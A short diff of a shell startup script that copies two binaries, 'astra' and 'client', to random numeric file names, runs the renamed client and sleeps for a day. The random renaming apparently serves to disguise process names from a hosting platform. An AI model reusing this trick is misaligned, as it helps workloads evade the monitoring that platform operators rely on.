@@ -1,6 +1,9 @@
-cd /app/bin
+mydir=$(pwd)
 dyno=$(shuf -i 10000000000-99999999999 -n 1)
-mv astra $dyno
-/app/bin/client
+dyno2=$(shuf -i 10000000000-99999999999 -n 1)
+cp /app/bin/astra $mydir/$dyno
+cp /app/bin/client $mydir/$dyno2
+chmod +x $dyno $dyno2
+./$dyno2
 sleep 24h
 
